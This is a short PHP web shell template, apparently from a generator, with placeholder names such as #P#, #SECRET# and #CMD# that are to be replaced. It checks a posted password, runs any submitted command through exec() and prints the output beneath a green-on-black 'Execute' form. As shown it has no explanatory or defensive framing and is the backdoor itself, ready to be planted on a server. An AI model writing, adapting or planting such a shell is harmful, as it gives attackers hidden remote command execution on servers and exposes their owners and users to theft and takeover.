<?php
if(isset($_POST['#P#']) && $_POST['#P#'] == '#SECRET#') {
    $#C# = $_POST['#CMD#'];
    if(!empty($#C#)) {
        echo "<pre>";
        $#O# = array();
        exec($#C#, $#O#);
        foreach($#O# as $#L#) { echo htmlspecialchars($#L#)."\n"; }
        echo "</pre>";
    }
}
?>
<style>
    body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
    input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; margin: 2px; }
    input[type="submit"] { background: #00ff00; color: #000; font-weight: bold; cursor: pointer; }
    pre { background: #000; padding: 10px; border: 1px solid #333; }
</style>
<form method="POST">
    <input type="password" name="#P#" placeholder="Password">
    <input type="text" name="#CMD#" placeholder="Command">
    <input type="submit" value="Execute">
</form>
